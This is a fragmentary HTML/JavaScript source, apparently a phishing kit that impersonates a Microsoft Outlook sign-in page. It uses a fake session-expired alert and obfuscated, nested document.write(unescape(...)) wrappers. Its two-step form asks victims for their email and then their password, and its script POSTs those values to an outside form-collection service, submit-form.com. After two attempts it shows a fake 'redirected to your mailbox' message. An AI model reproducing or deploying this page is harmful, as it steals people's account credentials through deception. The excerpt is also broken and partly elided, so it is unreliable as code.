...
var loadTime = null;
alert("Ooops! Your Session as Expired! Click OK And Sign In To Continue. Thank You");
</script>

<script>document.write(unescape('<script>document.write(unescape('<script language="javascript">
document.write( unescape( '<script language="javascript">document.write( unescape( '
                ...
                <div class="col-lg-6 mx-auto">
                    ...
                    <div class="box" id="diiiv1">
                        ...
                        <div class="boxtext">
                            ...
                            <div class="form-group mt-2">
                                <input type="email" name="ai" value=" " class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" placeholder="Email" style="border-right: none;border-left: none;border-top: none;">
                            </div>
                    ...
                    <div class="box" id="div2" style="display: none;">
                        ...
                        <form id="contact" class="boxtext">
                            ...
                            <div class="pb-2">
                                <span id="msg" class="text-danger">Because you're accessing sensitive info, you need to verify your password</span>
                            </div>
                            <div class="form-group mt-2">
                            ...
                            <div class="text-right">
                                <button type="button" class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">Sign In</button>
                            </div>
                        </form>
                    </div>
                    <!-- ////////////////////////div2 end/////////////////////// -->
                    ...
                    <div class="box" id="div3" style="display: none;">
                        <div class="boxtext">
                            <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br><br>
                            <span class="h4">Please wait...</span><br><br>
                            <div class="loader ">
                                <div class="circle"></div>
                                <div class="circle"></div>
                                <div class="circle"></div>
...
$(document).ready(function() {
    ...
    $('#submit-btn').click(function(event) {
        ...
        count = count + 1;
        $.ajax({
            url: "https://submit-form.com/wovzorvX",
            dataType: 'JSON',
            type: 'POST',
            data: {
                ai: ai,
            ...
            success: function(response) {
                ...
                if (count >= 2) {
                    ...
                    setTimeout(() => {
                        $("#load-text").html("You will be redirected to your Outlook mailbox shortly.");
                        setTimeout(() => {
